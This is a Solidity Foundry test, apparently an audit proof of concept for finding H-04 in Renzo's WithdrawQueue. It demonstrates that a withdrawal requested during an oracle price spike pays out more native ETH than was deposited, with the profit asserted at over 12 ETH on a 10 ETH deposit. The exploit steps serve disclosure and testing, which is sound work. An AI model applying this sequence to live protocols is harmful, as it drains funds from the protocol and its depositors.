// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {Setup} from "./warden_setup/Setup.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {WithdrawQueueStorageV1} from "contracts/Withdraw/WithdrawQueueStorage.sol";

/// @title H-04: Oracle Latency / MEV Sandwich via WithdrawQueue
/// @notice The protocol locks the exact `amountToRedeem` based on the oracle price at the time of withdrawal request. A user can extract value from the protocol by withdrawing in Native ETH during an oracle price spike.
/// @author 0xSchutze
contract Renzo_H04_PoC_Test is Test, Setup {
    address alice;
    address bob;
    IERC20 stEthAddr;
    address constant IS_NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function setUpMev() internal {
        stEthAddr = IERC20(address(stETH));
        alice = makeAddr("alice");
        bob = makeAddr("bob"); 
        
        stEthPriceOracle.setAnswer(1 ether);
        stETH.mint(alice, 10 ether);
        stETH.mint(bob, 105 ether);

        vm.startPrank(alice);
        stETH.approve(address(restakeManager), type(uint256).max);
        ezETH.approve(address(withdrawQueue), type(uint256).max);
        vm.stopPrank();

        // Support stETH for withdrawals
        WithdrawQueueStorageV1.TokenWithdrawBuffer[] memory buffers = new WithdrawQueueStorageV1.TokenWithdrawBuffer[](1);
        buffers[0] = WithdrawQueueStorageV1.TokenWithdrawBuffer(address(stEthAddr), 100 ether);
        
        vm.prank(OWNER);
        withdrawQueue.updateWithdrawBufferTarget(buffers);

        // Bob deposits to fill the buffer deficit
        vm.startPrank(bob);
        stETH.approve(address(restakeManager), type(uint256).max);
        restakeManager.deposit(stEthAddr, 105 ether);
        vm.stopPrank();

        // Provide Native ETH liquidity to WithdrawQueue for withdrawals
        vm.deal(address(withdrawQueue), 100 ether);
    }

    /// @notice WithdrawQueue.withdraw() locks amountToRedeem based on oracle price at request time. A post-request price spike lets the caller claim more Native ETH than they deposited.
    function test_WithdrawQueue_LocksInflatedValue() public {
        setUpMev();
        
        // 1. Arrange: Alice deposits 10 stETH at normal price (1 stETH = 1 ETH)
        vm.startPrank(alice);
        restakeManager.deposit(stEthAddr, 10 ether);
        uint256 aliceEzEth = ezETH.balanceOf(alice);
        vm.stopPrank();

        // 2. Act: Oracle price spikes to 1.5 ETH. Alice immediately requests a withdrawal in Native ETH.
        vm.prank(OWNER);
        stEthPriceOracle.setAnswer(1.5 ether);

        vm.startPrank(alice);
        // The protocol locks the withdrawal value based on the inflated ezETH price.
        withdrawQueue.withdraw(aliceEzEth, IS_NATIVE);

        // 3. Act: Alice claims the withdrawal after the 7-day cooldown period.
        vm.warp(block.timestamp + 7 days);
        withdrawQueue.claim(0);
        vm.stopPrank();

        uint256 finalBalance = alice.balance;
        uint256 profit = finalBalance - 10 ether;
        
        console.log("Alice Initial Deposit (ETH) : 10.0000");
        console.log("Alice Final Balance (ETH)   : %s.%s", finalBalance / 1 ether, (finalBalance % 1 ether) / 1e14);
        console.log("Extracted Profit (ETH)      : %s.%s", profit / 1 ether, (profit % 1 ether) / 1e14);

        // 4. Assert: Alice deposited 10 stETH (worth 10 ETH) but successfully extracted >12 ETH, profiting from the stale/manipulated oracle price.
        assertGt(finalBalance, 12 ether, "final balance must exceed 12 ETH: oracle spike not reflected in payout");
    }
}